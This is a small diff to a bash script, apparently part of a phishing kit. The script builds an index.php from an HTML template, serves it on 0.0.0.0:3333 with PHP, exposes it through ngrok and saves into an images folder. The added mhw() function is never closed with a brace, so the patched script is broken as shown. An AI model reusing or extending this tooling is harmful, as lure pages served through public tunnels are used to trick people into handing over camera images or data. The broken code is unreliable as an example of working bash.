@@ -42,6 +42,10 @@ done
 
 }
 
+mhw(){
+if [[ ! -d images/ ]]; then
+mkdir images
+fi
 
 wibigans(){
     website_template='hedy.html'
@@ -49,7 +53,6 @@ wibigans(){
     cat template.html >> index.php
 }
 ngrok(){
-    mkdir image
     printf "\e[1;92m[\e[0m+\e[1;92m] Start php server su(Hostpotnya Hidupin su!!) \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
     php -S 0.0.0.0:3333 > /dev/null 2>&1 &
     sleep 2
@@ -119,6 +122,7 @@ pembuka
 load
 banner
 wibigans
+mhw
 ngrok
 recode
 hedygans
